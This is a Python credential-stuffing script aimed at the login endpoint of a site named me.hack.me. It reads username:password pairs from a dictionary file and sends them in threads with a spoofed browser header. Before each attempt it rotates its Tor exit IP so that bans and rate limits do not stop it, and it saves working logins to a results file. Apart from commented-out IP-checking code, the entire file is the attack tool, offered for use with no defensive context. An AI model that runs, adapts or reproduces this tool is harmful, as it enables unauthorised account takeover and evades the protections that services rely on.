#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#Variab
import sys
import os 
import re
import os.path
import requests
import threading
import time
import TorCtl
import urllib.request
from stem.control import Controller
from stem import Signal
from stem.connection import connect

# initialize some
# holding variables
oldIP = "0.0.0.0"
newIP = "0.0.0.0"

# how many IP addresses
# through which to iterate?
nbrOfIpAddresses = 3

# seconds between
# IP address checks
secondsBetweenChecks = 2

THREADS_COUNT = 2
fp=os.path.dirname(sys.argv[0])
result=os.path.join(fp,"result.txt")
filename=os.path.join(fp,"dictionary.txt")
# filename=sys.argv[1]

headers = {
        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0',
        'Accept' : 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.422764200',
        'Accept-Encoding' : 'gzip, deflate',
        'Connection' : 'keep-alive',
        'Referer' : 'https://me.hack.me/',
        }

def Auth (username,password): 
	
    postdata = {
        'CLA' : 'auth',
        'FUN' : 'loginJson',
        'password' : password,
        'token' :   ':)',
        'username' : username        
       }

    proxies = {
       "http": "127.0.0.1:8123",
       # "https": "127.0.0.1:8118",
       }
   
    url="https://me.hack.me/execute.php"
    r = requests.post(url,  data=postdata, headers=headers,  proxies=proxies)
    
    with open(result, 'a') as PR:
     # d=requests.get("http://icanhazip.com", proxies=proxies)
     # print(d.text)	
     try:
        ss=format(str(r.text))
        sa=ss.lstrip('{').rstrip('}').replace('"',"").replace("content:","").replace("\\","").rstrip().lstrip().split(',')
        print(sa[1])
        url2=format(str(sa[1]))
        re = requests.get(url2, proxies=proxies)
        if re.headers['content-type'] == 'image/jpeg':
           PR.write('found : users:' + username + ' ' + 'Пароль:'+password + '\n')
        # auth_cookie=dict(MEPHPSESSID=r.cookies['MEPHPSESSID'])
        # rs=requests.get(url2, cookies=auth_cookie,proxies=proxies)
        # ss=format(str(rs.content))
        # sa='<h1>Profile\\r\\n\\t\\t\\t\\t\\t\\t'+username
        # # if sa in ss:
     except:
        PR.write("no-login : users:" + username + ' ' + 'Пароль:'+password+ '\n')

def renew_connection():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password = 'bas7Lod81')
        controller.signal(Signal.NEWNYM)
        controller.close()

if __name__ == '__main__':
    
    
 # if len(sys.argv) < 2:
 #    print("Usage: %s  /path/to/dictionary in directory" % (str(fp))) 
 #    print("Example: %s  dict.txt" % (str(sys.argv[0])))
 #    print("Dictionary should be in user:pass format")
 #    sys.exit(1)
 with open(result, 'w') as FR:
  pass
 with open(filename, 'r') as FD:
 	for _ in range(THREADS_COUNT):
 		for line in FD.readlines():
 			renew_connection()
 			username, password = line.strip().split(":")
 			t = threading.Thread(target=Auth, args=(username,password))
 			t.daemon = True
 			t.start()
 	while threading.active_count() >1:
 		time.sleep(1)
 print("FINISHED")
  #    # if it's the first pass
 #    if newIP == "0.0.0.0":
 #        # renew the TOR connection
 #        renew_connection()
 #        # obtain the "new" IP address
 #        newIP = request("http://icanhazip.com/")
 #    # otherwise
 #    else:
 #        # remember the
 #        # "new" IP address
 #        # as the "old" IP address
 #        oldIP = newIP
 #        # refresh the TOR connection
 #        renew_connection()
 #        # obtain the "new" IP address
 #        newIP = request("http://icanhazip.com/")

 #    # zero the 
 #    # elapsed seconds    
 #    seconds = 0

 #    # loop until the "new" IP address
 #    # is different than the "old" IP address,
 #    # as it may take the TOR network some
 #    # time to effect a different IP address
 #    while oldIP == newIP:
 #        # sleep this thread
 #        # for the specified duration
 #        time.sleep(secondsBetweenChecks)
 #        # track the elapsed seconds
 #        seconds += secondsBetweenChecks
 #        # obtain the current IP address
 #        newIP = request("http://icanhazip.com/")
 #        # signal that the program is still awaiting a different IP address
 #        print ("%d seconds elapsed awaiting a different IP address." % seconds)
 #    # output the
 #    # new IP address
 #    print ("")
 #    print ("newIP: %s" % newIP)